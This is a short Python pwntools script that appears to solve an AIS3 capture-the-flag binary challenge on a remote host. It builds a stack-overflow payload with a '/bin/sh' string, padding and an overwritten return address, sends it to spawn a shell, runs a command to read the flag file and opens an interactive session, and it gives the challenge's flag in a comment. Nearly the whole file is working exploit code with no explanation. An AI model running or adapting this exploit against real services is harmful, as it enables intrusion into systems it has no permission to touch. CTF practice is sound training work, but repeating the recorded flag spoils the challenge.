#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# AIS3{r0p_is_e4sy_4nd_fUn}


context.arch = 'amd64'

host , port = 'pwnhub.tw' , 55688
y = remote( host , port )

# execveat

p = '/bin/sh\x00'
p += 'D' * ( 0x128 - len( p ) )
p += p64( 0x4000ed )
p += 'a' * ( 322 - len( p ) )

y.send( p )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
